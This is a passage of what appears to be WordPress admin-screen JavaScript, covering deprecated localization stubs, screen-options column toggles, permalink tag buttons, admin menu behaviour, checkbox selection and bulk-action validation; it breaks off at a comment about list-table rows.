/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.8.0
 * @deprecated 5.5.0
 */
window.tagsl10n = {
	noPerm: '',
	broken: ''
};

window.tagsl10n = window.tagsl10n || deprecateL10nObject( 'tagsl10n', window.tagsl10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.adminCommentsL10n = window.adminCommentsL10n || {
	hotkeys_highlight_first: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_first',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_first; }
	},
	hotkeys_highlight_last: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_last',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_last; }
	},
	replyApprove: '',
	reply: '',
	warnQuickEdit: '',
	warnCommentChanges: '',
	docTitleComments: '',
	docTitleCommentsCount: ''
};

window.adminCommentsL10n = deprecateL10nObject( 'adminCommentsL10n', window.adminCommentsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.tagsSuggestL10n = window.tagsSuggestL10n || {
	tagDelimiter: '',
	removeTerm: '',
	termSelected: '',
	termAdded: '',
	termRemoved: ''
};

window.tagsSuggestL10n = deprecateL10nObject( 'tagsSuggestL10n', window.tagsSuggestL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.5.0
 * @deprecated 5.5.0
 */
window.wpColorPickerL10n = window.wpColorPickerL10n || {
	clear: '',
	clearAriaLabel: '',
	defaultString: '',
	defaultAriaLabel: '',
	pick: '',
	defaultLabel: ''
};

window.wpColorPickerL10n = deprecateL10nObject( 'wpColorPickerL10n', window.wpColorPickerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.attachMediaBoxL10n = window.attachMediaBoxL10n || {
	error: ''
};

window.attachMediaBoxL10n = deprecateL10nObject( 'attachMediaBoxL10n', window.attachMediaBoxL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.postL10n = window.postL10n || {
	ok: '',
	cancel: '',
	publishOn: '',
	publishOnFuture: '',
	publishOnPast: '',
	dateFormat: '',
	showcomm: '',
	endcomm: '',
	publish: '',
	schedule: '',
	update: '',
	savePending: '',
	saveDraft: '',
	'private': '',
	'public': '',
	publicSticky: '',
	password: '',
	privatelyPublished: '',
	published: '',
	saveAlert: '',
	savingText: '',
	permalinkSaved: ''
};

window.postL10n = deprecateL10nObject( 'postL10n', window.postL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.inlineEditL10n = window.inlineEditL10n || {
	error: '',
	ntdeltitle: '',
	notitle: '',
	comma: '',
	saved: ''
};

window.inlineEditL10n = deprecateL10nObject( 'inlineEditL10n', window.inlineEditL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.plugininstallL10n = window.plugininstallL10n || {
	plugin_information: '',
	plugin_modal_label: '',
	ays: ''
};

window.plugininstallL10n = deprecateL10nObject( 'plugininstallL10n', window.plugininstallL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.0.0
 * @deprecated 5.5.0
 */
window.navMenuL10n = window.navMenuL10n || {
	noResultsFound: '',
	warnDeleteMenu: '',
	saveAlert: '',
	untitled: ''
};

window.navMenuL10n = deprecateL10nObject( 'navMenuL10n', window.navMenuL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.commentL10n = window.commentL10n || {
	submittedOn: '',
	dateFormat: ''
};

window.commentL10n = deprecateL10nObject( 'commentL10n', window.commentL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.9.0
 * @deprecated 5.5.0
 */
window.setPostThumbnailL10n = window.setPostThumbnailL10n || {
	setThumbnail: '',
	saving: '',
	error: '',
	done: ''
};

window.setPostThumbnailL10n = deprecateL10nObject( 'setPostThumbnailL10n', window.setPostThumbnailL10n, '5.5.0' );

/**
 * Removed in 6.5.0, needed for back-compatibility.
 *
 * @since 4.5.0
 * @deprecated 6.5.0
 */
window.uiAutocompleteL10n = window.uiAutocompleteL10n || {
	noResults: '',
	oneResult: '',
	manyResults: '',
	itemSelected: ''
};

window.uiAutocompleteL10n = deprecateL10nObject( 'uiAutocompleteL10n', window.uiAutocompleteL10n, '6.5.0' );

/**
 * Removed in 3.3.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 3.3.0
 */
window.adminMenu = {
	init : function() {},
	fold : function() {},
	restoreMenuState : function() {},
	toggle : function() {},
	favorites : function() {}
};

// Show/hide/save table columns.
window.columns = {

	/**
	 * Initializes the column toggles in the screen options.
	 *
	 * Binds an onClick event to the checkboxes to show or hide the table columns
	 * based on their toggled state. And persists the toggled state.
	 *
	 * @since 2.7.0
	 *
	 * @return {void}
	 */
	init : function() {
		var that = this;
		$('.hide-column-tog', '#adv-settings').on( 'click', function() {
			var $t = $(this), column = $t.val();
			if ( $t.prop('checked') )
				that.checked(column);
			else
				that.unchecked(column);

			columns.saveManageColumnsState();
		});
	},

	/**
	 * Saves the toggled state for the columns.
	 *
	 * Saves whether the columns should be shown or hidden on a page.
	 *
	 * @since 3.0.0
	 *
	 * @return {void}
	 */
	saveManageColumnsState : function() {
		var hidden = this.hidden();
		$.post(
			ajaxurl,
			{
				action: 'hidden-columns',
				hidden: hidden,
				screenoptionnonce: $('#screenoptionnonce').val(),
				page: pagenow
			},
			function() {
				wp.a11y.speak( __( 'Screen Options updated.' ) );
			}
		);
	},

	/**
	 * Makes a column visible and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	checked : function(column) {
		$('.column-' + column).removeClass( 'hidden' );
		this.colSpanChange(+1);
	},

	/**
	 * Hides a column and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	unchecked : function(column) {
		$('.column-' + column).addClass( 'hidden' );
		this.colSpanChange(-1);
	},

	/**
	 * Gets all hidden columns.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} The hidden column names separated by a comma.
	 */
	hidden : function() {
		return $( '.manage-column[id]' ).filter( '.hidden' ).map(function() {
			return this.id;
		}).get().join( ',' );
	},

	/**
	 * Gets the checked column toggles from the screen options.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} String containing the checked column names.
	 */
	useCheckboxesForHidden : function() {
		this.hidden = function(){
			return $('.hide-column-tog').not(':checked').map(function() {
				var id = this.id;
				return id.substring( id, id.length - 5 );
			}).get().join(',');
		};
	},

	/**
	 * Adjusts the column span for the table.
	 *
	 * @since 3.1.0
	 *
	 * @param {number} diff The modifier for the column span.
	 */
	colSpanChange : function(diff) {
		var $t = $('table').find('.colspanchange'), n;
		if ( !$t.length )
			return;
		n = parseInt( $t.attr('colspan'), 10 ) + diff;
		$t.attr('colspan', n.toString());
	}
};

$( function() { columns.init(); } );

/**
 * Validates that the required form fields are not empty.
 *
 * @since 2.9.0
 *
 * @param {jQuery} form The form to validate.
 *
 * @return {boolean} Returns true if all required fields are not an empty string.
 */
window.validateForm = function( form ) {
	return !$( form )
		.find( '.form-required' )
		.filter( function() { return $( ':input:visible', this ).val() === ''; } )
		.addClass( 'form-invalid' )
		.find( ':input:visible' )
		.on( 'change', function() { $( this ).closest( '.form-invalid' ).removeClass( 'form-invalid' ); } )
		.length;
};

// Stub for doing better warnings.
/**
 * Shows message pop-up notice or confirmation message.
 *
 * @since 2.7.0
 *
 * @type {{warn: showNotice.warn, note: showNotice.note}}
 *
 * @return {void}
 */
window.showNotice = {

	/**
	 * Shows a delete confirmation pop-up message.
	 *
	 * @since 2.7.0
	 *
	 * @return {boolean} Returns true if the message is confirmed.
	 */
	warn : function() {
		if ( confirm( __( 'You are about to permanently delete these items from your site.\nThis action cannot be undone.\n\'Cancel\' to stop, \'OK\' to delete.' ) ) ) {
			return true;
		}

		return false;
	},

	/**
	 * Shows an alert message.
	 *
	 * @since 2.7.0
	 *
	 * @param text The text to display in the message.
	 */
	note : function(text) {
		alert(text);
	}
};

/**
 * Represents the functions for the meta screen options panel.
 *
 * @since 3.2.0
 *
 * @type {{element: null, toggles: null, page: null, init: screenMeta.init,
 *         toggleEvent: screenMeta.toggleEvent, open: screenMeta.open,
 *         close: screenMeta.close}}
 *
 * @return {void}
 */
window.screenMeta = {
	element: null, // #screen-meta
	toggles: null, // .screen-meta-toggle
	page:    null, // #wpcontent

	/**
	 * Initializes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	init: function() {
		this.element = $('#screen-meta');
		this.toggles = $( '#screen-meta-links' ).find( '.show-settings' );
		this.page    = $('#wpcontent');

		this.toggles.on( 'click', this.toggleEvent );
	},

	/**
	 * Toggles the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	toggleEvent: function() {
		var panel = $( '#' + $( this ).attr( 'aria-controls' ) );

		if ( !panel.length )
			return;

		if ( panel.is(':visible') )
			screenMeta.close( panel, $(this) );
		else
			screenMeta.open( panel, $(this) );
	},

	/**
	 * Opens the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	open: function( panel, button ) {

		$( '#screen-meta-links' ).find( '.screen-meta-toggle' ).not( button.parent() ).css( 'visibility', 'hidden' );

		panel.parent().show();

		/**
		 * Sets the focus to the meta options panel and adds the necessary CSS classes.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideDown( 'fast', function() {
			panel.removeClass( 'hidden' ).trigger( 'focus' );
			button.addClass( 'screen-meta-active' ).attr( 'aria-expanded', true );
		});

		$document.trigger( 'screen:options:open' );
	},

	/**
	 * Closes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	close: function( panel, button ) {
		/**
		 * Hides the screen meta options panel.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideUp( 'fast', function() {
			button.removeClass( 'screen-meta-active' ).attr( 'aria-expanded', false );
			$('.screen-meta-toggle').css('visibility', '');
			panel.parent().hide();
			panel.addClass( 'hidden' );
		});

		$document.trigger( 'screen:options:close' );
	}
};

/**
 * Initializes the help tabs in the help panel.
 *
 * @param {Event} e The event object.
 *
 * @return {void}
 */
$('.contextual-help-tabs').on( 'click', 'a', function(e) {
	var link = $(this),
		panel;

	e.preventDefault();

	// Don't do anything if the click is for the tab already showing.
	if ( link.is('.active a') )
		return false;

	// Links.
	$('.contextual-help-tabs .active').removeClass('active');
	link.parent('li').addClass('active');

	panel = $( link.attr('href') );

	// Panels.
	$('.help-tab-content').not( panel ).removeClass('active').hide();
	panel.addClass('active').show();
});

/**
 * Update custom permalink structure via buttons.
 */
var permalinkStructureFocused = false,
    $permalinkStructure       = $( '#permalink_structure' ),
    $permalinkStructureInputs = $( '.permalink-structure input:radio' ),
    $permalinkCustomSelection = $( '#custom_selection' ),
    $availableStructureTags   = $( '.form-table.permalink-structure .available-structure-tags button' );

// Change permalink structure input when selecting one of the common structures.
$permalinkStructureInputs.on( 'change', function() {
	if ( 'custom' === this.value ) {
		return;
	}

	$permalinkStructure.val( this.value );

	// Update button states after selection.
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$permalinkStructure.on( 'click input', function() {
	$permalinkCustomSelection.prop( 'checked', true );
} );

// Check if the permalink structure input field has had focus at least once.
$permalinkStructure.on( 'focus', function( event ) {
	permalinkStructureFocused = true;
	$( this ).off( event );
} );

/**
 * Enables or disables a structure tag button depending on its usage.
 *
 * If the structure is already used in the custom permalink structure,
 * it will be disabled.
 *
 * @param {Object} button Button jQuery object.
 */
function changeStructureTagButtonState( button ) {
	if ( -1 !== $permalinkStructure.val().indexOf( button.text().trim() ) ) {
		button.attr( 'data-label', button.attr( 'aria-label' ) );
		button.attr( 'aria-label', button.attr( 'data-used' ) );
		button.attr( 'aria-pressed', true );
		button.addClass( 'active' );
	} else if ( button.attr( 'data-label' ) ) {
		button.attr( 'aria-label', button.attr( 'data-label' ) );
		button.attr( 'aria-pressed', false );
		button.removeClass( 'active' );
	}
}

// Check initial button state.
$availableStructureTags.each( function() {
	changeStructureTagButtonState( $( this ) );
} );

// Observe permalink structure field and disable buttons of tags that are already present.
$permalinkStructure.on( 'change', function() {
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$availableStructureTags.on( 'click', function() {
	var permalinkStructureValue = $permalinkStructure.val(),
	    selectionStart          = $permalinkStructure[ 0 ].selectionStart,
	    selectionEnd            = $permalinkStructure[ 0 ].selectionEnd,
	    textToAppend            = $( this ).text().trim(),
	    textToAnnounce,
	    newSelectionStart;

	if ( $( this ).hasClass( 'active' ) ) {
		textToAnnounce = $( this ).attr( 'data-removed' );
	} else {
		textToAnnounce = $( this ).attr( 'data-added' );
	}

	// Remove structure tag if already part of the structure.
	if ( -1 !== permalinkStructureValue.indexOf( textToAppend ) ) {
		permalinkStructureValue = permalinkStructureValue.replace( textToAppend + '/', '' );

		$permalinkStructure.val( '/' === permalinkStructureValue ? '' : permalinkStructureValue );

		// Announce change to screen readers.
		$( '#custom_selection_updated' ).text( textToAnnounce );

		// Disable button.
		changeStructureTagButtonState( $( this ) );

		return;
	}

	// Input field never had focus, move selection to end of input.
	if ( ! permalinkStructureFocused && 0 === selectionStart && 0 === selectionEnd ) {
		selectionStart = selectionEnd = permalinkStructureValue.length;
	}

	$permalinkCustomSelection.prop( 'checked', true );

	// Prepend and append slashes if necessary.
	if ( '/' !== permalinkStructureValue.substr( 0, selectionStart ).substr( -1 ) ) {
		textToAppend = '/' + textToAppend;
	}

	if ( '/' !== permalinkStructureValue.substr( selectionEnd, 1 ) ) {
		textToAppend = textToAppend + '/';
	}

	// Insert structure tag at the specified position.
	$permalinkStructure.val( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend + permalinkStructureValue.substr( selectionEnd ) );

	// Announce change to screen readers.
	$( '#custom_selection_updated' ).text( textToAnnounce );

	// Disable button.
	changeStructureTagButtonState( $( this ) );

	// If input had focus give it back with cursor right after appended text.
	if ( permalinkStructureFocused && $permalinkStructure[0].setSelectionRange ) {
		newSelectionStart = ( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend ).length;
		$permalinkStructure[0].setSelectionRange( newSelectionStart, newSelectionStart );
		$permalinkStructure.trigger( 'focus' );
	}
} );

$( function() {
	var checks, first, last, checked, sliced, mobileEvent, transitionTimeout, focusedRowActions,
		lastClicked = false,
		pageInput = $('input.current-page'),
		currentPage = pageInput.val(),
		isIOS = /iPhone|iPad|iPod/.test( navigator.userAgent ),
		isAndroid = navigator.userAgent.indexOf( 'Android' ) !== -1,
		$adminMenuWrap = $( '#adminmenuwrap' ),
		$wpwrap = $( '#wpwrap' ),
		$adminmenu = $( '#adminmenu' ),
		$overlay = $( '#wp-responsive-overlay' ),
		$toolbar = $( '#wp-toolbar' ),
		$toolbarPopups = $toolbar.find( 'a[aria-haspopup="true"]' ),
		$sortables = $('.meta-box-sortables'),
		wpResponsiveActive = false,
		$adminbar = $( '#wpadminbar' ),
		lastScrollPosition = 0,
		pinnedMenuTop = false,
		pinnedMenuBottom = false,
		menuTop = 0,
		menuState,
		menuIsPinned = false,
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		},
		$headerEnd = $( '.wp-header-end' );

	/**
	 * Makes the fly-out submenu header clickable, when the menu is folded.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$adminmenu.on('click.wp-submenu-head', '.wp-submenu-head', function(e){
		$(e.target).parent().siblings('a').get(0).click();
	});

	/**
	 * Collapses the admin menu.
	 *
	 * @return {void}
	 */
	$( '#collapse-button' ).on( 'click.collapse-menu', function() {
		var viewportWidth = getViewportWidth() || 961;

		// Reset any compensation for submenus near the bottom of the screen.
		$('#adminmenu div.wp-submenu').css('margin-top', '');

		if ( viewportWidth <= 960 ) {
			if ( $body.hasClass('auto-fold') ) {
				$body.removeClass('auto-fold').removeClass('folded');
				setUserSetting('unfold', 1);
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('auto-fold');
				setUserSetting('unfold', 0);
				menuState = 'folded';
			}
		} else {
			if ( $body.hasClass('folded') ) {
				$body.removeClass('folded');
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('folded');
				setUserSetting('mfold', 'f');
				menuState = 'folded';
			}
		}

		$document.trigger( 'wp-collapse-menu', { state: menuState } );
	});

	/**
	 * Ensures an admin submenu is within the visual viewport.
	 *
	 * @since 4.1.0
	 *
	 * @param {jQuery} $menuItem The parent menu item containing the submenu.
	 *
	 * @return {void}
	 */
	function adjustSubmenu( $menuItem ) {
		var bottomOffset, pageHeight, adjustment, theFold, menutop, wintop, maxtop,
			$submenu = $menuItem.find( '.wp-submenu' );

		menutop = $menuItem.offset().top;
		wintop = $window.scrollTop();
		maxtop = menutop - wintop - 30; // max = make the top of the sub almost touch admin bar.

		bottomOffset = menutop + $submenu.height() + 1; // Bottom offset of the menu.
		pageHeight = $wpwrap.height();                  // Height of the entire page.
		adjustment = 60 + bottomOffset - pageHeight;
		theFold = $window.height() + wintop - 50;       // The fold.

		if ( theFold < ( bottomOffset - adjustment ) ) {
			adjustment = bottomOffset - theFold;
		}

		if ( adjustment > maxtop ) {
			adjustment = maxtop;
		}

		if ( adjustment > 1 && $('#wp-admin-bar-menu-toggle').is(':hidden') ) {
			$submenu.css( 'margin-top', '-' + adjustment + 'px' );
		} else {
			$submenu.css( 'margin-top', '' );
		}
	}

	if ( 'ontouchstart' in window || /IEMobile\/[1-9]/.test(navigator.userAgent) ) { // Touch screen device.
		// iOS Safari works with touchstart, the rest work with click.
		mobileEvent = isIOS ? 'touchstart' : 'click';

		/**
		 * Closes any open submenus when touch/click is not on the menu.
		 *
		 * @param {Event} e The event object.
		 *
		 * @return {void}
		 */
		$body.on( mobileEvent+'.wp-mobile-hover', function(e) {
			if ( $adminmenu.data('wp-responsive') ) {
				return;
			}

			if ( ! $( e.target ).closest( '#adminmenu' ).length ) {
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
			}
		});

		/**
		 * Handles the opening or closing the submenu based on the mobile click|touch event.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.find( 'a.wp-has-submenu' ).on( mobileEvent + '.wp-mobile-hover', function( event ) {
			var $menuItem = $(this).parent();

			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			/*
			 * Show the sub instead of following the link if:
			 * 	- the submenu is not open.
			 * 	- the submenu is not shown inline or the menu is not folded.
			 */
			if ( ! $menuItem.hasClass( 'opensub' ) && ( ! $menuItem.hasClass( 'wp-menu-open' ) || $menuItem.width() < 40 ) ) {
				event.preventDefault();
				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass('opensub');
			}
		});
	}

	if ( ! isIOS && ! isAndroid ) {
		$adminmenu.find( 'li.wp-has-submenu' ).hoverIntent({

			/**
			 * Opens the submenu when hovered over the menu item for desktops.
			 *
			 * @return {void}
			 */
			over: function() {
				var $menuItem = $( this ),
					$submenu = $menuItem.find( '.wp-submenu' ),
					top = parseInt( $submenu.css( 'top' ), 10 );

				if ( isNaN( top ) || top > -5 ) { // The submenu is visible.
					return;
				}

				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass( 'opensub' );
			},

			/**
			 * Closes the submenu when no longer hovering the menu item.
			 *
			 * @return {void}
			 */
			out: function(){
				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				$( this ).removeClass( 'opensub' ).find( '.wp-submenu' ).css( 'margin-top', '' );
			},
			timeout: 200,
			sensitivity: 7,
			interval: 90
		});

		/**
		 * Opens the submenu on when focused on the menu item.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.on( 'focus.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				// The menu is in responsive mode, bail.
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).addClass( 'opensub' );

			/**
			 * Closes the submenu on blur from the menu item.
			 *
			 * @param {Event} event The event object.
			 *
			 * @return {void}
			 */
		}).on( 'blur.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).removeClass( 'opensub' );

			/**
			 * Adjusts the size for the submenu.
			 *
			 * @return {void}
			 */
		}).find( 'li.wp-has-submenu.wp-not-current-submenu' ).on( 'focusin.adminmenu', function() {
			adjustSubmenu( $( this ) );
		});
	}

	/*
	 * The `.below-h2` class is here just for backward compatibility with plugins
	 * that are (incorrectly) using it. Do not use. Use `.inline` instead. See #34570.
	 * If '.wp-header-end' is found, append the notices after it otherwise
	 * after the first h1 or h2 heading found within the main content.
	 */
	if ( ! $headerEnd.length ) {
		$headerEnd = $( '.wrap h1, .wrap h2' ).first();
	}
	$( 'div.updated, div.error, div.notice' ).not( '.inline, .below-h2' ).insertAfter( $headerEnd );

	/**
	 * Makes notices dismissible.
	 *
	 * @since 4.4.0
	 *
	 * @return {void}
	 */
	function makeNoticesDismissible() {
		$( '.notice.is-dismissible' ).each( function() {
			var $el = $( this ),
				$button = $( '<button type="button" class="notice-dismiss"><span class="screen-reader-text"></span></button>' );

			if ( $el.find( '.notice-dismiss' ).length ) {
				return;
			}

			// Ensure plain text.
			$button.find( '.screen-reader-text' ).text( __( 'Dismiss this notice.' ) );
			$button.on( 'click.wp-dismiss-notice', function( event ) {
				event.preventDefault();
				$el.fadeTo( 100, 0, function() {
					$el.slideUp( 100, function() {
						$el.remove();
					});
				});
			});

			$el.append( $button );
		});
	}

	$document.on( 'wp-updates-notice-added wp-plugin-install-error wp-plugin-update-error wp-plugin-delete-error wp-theme-install-error wp-theme-delete-error wp-notice-added', makeNoticesDismissible );

	// Init screen meta.
	screenMeta.init();

	/**
	 * Checks a checkbox.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @return {boolean} Returns whether a checkbox is checked or not.
	 */
	$body.on( 'click', 'tbody > tr > .check-column :checkbox', function( event ) {
		// Shift click to select a range of checkboxes.
		if ( 'undefined' == event.shiftKey ) { return true; }
		if ( event.shiftKey ) {
			if ( !lastClicked ) { return true; }
			checks = $( lastClicked ).closest( 'form' ).find( ':checkbox' ).filter( ':visible:enabled' );
			first = checks.index( lastClicked );
			last = checks.index( this );
			checked = $(this).prop('checked');
			if ( 0 < first && 0 < last && first != last ) {
				sliced = ( last > first ) ? checks.slice( first, last ) : checks.slice( last, first );
				sliced.prop( 'checked', function() {
					if ( $(this).closest('tr').is(':visible') )
						return checked;

					return false;
				});
			}
		}
		lastClicked = this;

		// Toggle the "Select all" checkboxes depending if the other ones are all checked or not.
		var unchecked = $(this).closest('tbody').find('tr').find(':checkbox').filter(':visible:enabled').not(':checked');

		/**
		 * Determines if all checkboxes are checked.
		 *
		 * @return {boolean} Returns true if there are no unchecked checkboxes.
		 */
		$(this).closest('table').children('thead, tfoot').find(':checkbox').prop('checked', function() {
			return ( 0 === unchecked.length );
		});

		return true;
	});

	/**
	 * Controls all the toggles on bulk toggle change.
	 *
	 * When the bulk checkbox is changed, all the checkboxes in the tables are changed accordingly.
	 * When the shift-button is pressed while changing the bulk checkbox the checkboxes in the table are inverted.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @param {Event} event The event object.
	 *
	 * @return {boolean}
	 */
	$body.on( 'click.wp-toggle-checkboxes', 'thead .check-column :checkbox, tfoot .check-column :checkbox', function( event ) {
		var $this = $(this),
			$table = $this.closest( 'table' ),
			controlChecked = $this.prop('checked'),
			toggle = event.shiftKey || $this.data('wp-toggle');

		$table.children( 'tbody' ).filter(':visible')
			.children().children('.check-column').find(':checkbox')
			/**
			 * Updates the checked state on the checkbox in the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( $(this).is(':hidden,:disabled') ) {
					return false;
				}

				if ( toggle ) {
					return ! $(this).prop( 'checked' );
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});

		$table.children('thead,  tfoot').filter(':visible')
			.children().children('.check-column').find(':checkbox')

			/**
			 * Syncs the bulk checkboxes on the top and bottom of the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( toggle ) {
					return false;
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});
	});

	/**
	 * Marries a secondary control to its primary control.
	 *
	 * @param {jQuery} topSelector    The top selector element.
	 * @param {jQuery} topSubmit      The top submit element.
	 * @param {jQuery} bottomSelector The bottom selector element.
	 * @param {jQuery} bottomSubmit   The bottom submit element.
	 * @return {void}
	 */
	function marryControls( topSelector, topSubmit, bottomSelector, bottomSubmit ) {
		/**
		 * Updates the primary selector when the secondary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateTopSelector() {
			topSelector.val($(this).val());
		}
		bottomSelector.on('change', updateTopSelector);

		/**
		 * Updates the secondary selector when the primary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateBottomSelector() {
			bottomSelector.val($(this).val());
		}
		topSelector.on('change', updateBottomSelector);

		/**
		 * Triggers the primary submit when then secondary submit is clicked.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function triggerSubmitClick(e) {
			e.preventDefault();
			e.stopPropagation();

			topSubmit.trigger('click');
		}
		bottomSubmit.on('click', triggerSubmitClick);
	}

	// Marry the secondary "Bulk actions" controls to the primary controls:
	marryControls( $('#bulk-action-selector-top'), $('#doaction'), $('#bulk-action-selector-bottom'), $('#doaction2') );

	// Marry the secondary "Change role to" controls to the primary controls:
	marryControls( $('#new_role'), $('#changeit'), $('#new_role2'), $('#changeit2') );

	var addAdminNotice = function( data ) {
		var $notice = $( data.selector ),
			$headerEnd = $( '.wp-header-end' ),
			type,
			dismissible,
			$adminNotice;

		delete data.selector;

		dismissible = ( data.dismissible && data.dismissible === true ) ? ' is-dismissible' : '';
		type        = ( data.type ) ? data.type : 'info';

		$adminNotice = '<div id="' + data.id + '" class="notice notice-' + data.type + dismissible + '"><p>' + data.message + '</p></div>';

		// Check if this admin notice already exists.
		if ( ! $notice.length ) {
			$notice = $( '#' + data.id );
		}

		if ( $notice.length ) {
			$notice.replaceWith( $adminNotice );
		} else if ( $headerEnd.length ) {
			$headerEnd.after( $adminNotice );
		} else {
			if ( 'customize' === pagenow ) {
				$( '.customize-themes-notifications' ).append( $adminNotice );
			} else {
				$( '.wrap' ).find( '> h1' ).after( $adminNotice );
			}
		}

		$document.trigger( 'wp-notice-added' );
	};

	$( '.bulkactions' ).parents( 'form' ).on( 'submit', function( event ) {
		var form = this,
			submitterName = event.originalEvent && event.originalEvent.submitter ? event.originalEvent.submitter.name : false,
			currentPageSelector = form.querySelector( '#current-page-selector' );

		if ( currentPageSelector && currentPageSelector.defaultValue !== currentPageSelector.value ) {
			return; // Pagination form submission.
		}

		// Observe submissions from posts lists for 'bulk_action' or users lists for 'new_role'.
		var bulkFieldRelations = {
			'bulk_action' : window.bulkActionObserverIds.bulk_action,
			'changeit' : window.bulkActionObserverIds.changeit
		};
		if ( ! Object.keys( bulkFieldRelations ).includes( submitterName ) ) {
			return;
		}

		var values = new FormData(form);
		var value = values.get( bulkFieldRelations[ submitterName ] ) || '-1';

		// Check that the action is not the default one.
		if ( value !== '-1' ) {
			// Check that at least one item is selected.
			var itemsSelected = form.querySelectorAll( '.wp-list-table tbody .check-column input[type="checkbox"]:checked' );

			if ( itemsSelected.length > 0 ) {
				return;
			}
		}
		event.preventDefault();
		event.stopPropagation();
		$( 'html, body' ).animate( { scrollTop: 0 } );

		var errorMessage = __( 'Please select at least one item to perform this action on.' );
		addAdminNotice( {
			id: 'no-items-selected',
			type: 'error',
			message: errorMessage,
			dismissible: true,
		} );

		wp.a11y.speak( errorMessage );
	});

	/**
	 * Shows row actions on focus of its parent container element or any other elements contained within.
	 *
	 * @return {void}
	 */
	$( '#wpbody-content' ).on({
		focusin: function() {
			clearTimeout( transitionTimeout );
			focusedRowActions = $( this ).find( '.row-actions' );
			// transitionTimeout is necessary for Firefox, but Chrome won't remove the CSS class without a little help.
			$( '.row-actions' ).not( this ).removeClass( 'visible' );
			focusedRowActions.addClass( 'visible' );
		},
		focusout: function() {
			// Tabbing between post title and .row-actions links needs a brief pause, otherwise
			// the .row-actions div gets hidden in transit in some browsers (ahem, Firefox).
			transitionTimeout = setTimeout( function() {
				focusedRowActions.removeClass( 'visible' );
			}, 30 );
		}
	}, '.table-view-list .has-row-actions' );

	// Toggle list table rows on small screens.
